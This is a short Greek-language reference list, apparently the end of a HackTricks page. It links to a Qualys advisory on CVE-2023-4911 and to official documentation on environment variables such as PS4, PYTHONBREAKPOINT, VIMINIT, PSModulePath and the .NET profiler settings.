- [6] [CVE-2023-4911: Looney Tunables - Τοπική κλιμάκωση προνομίων στο ld.so της glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Εγχειρίδιο GNU Bash - Μεταβλητές Bash (`PS4`) και η ενσωματωμένη εντολή Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Η ενσωματωμένη breakpoint() και το PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Τεκμηρίωση Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath και αυτόματη φόρτωση modules του PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Ρυθμίσεις διαμόρφωσης αποσφαλμάτωσης και profiling του .NET (μεταβλητές profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
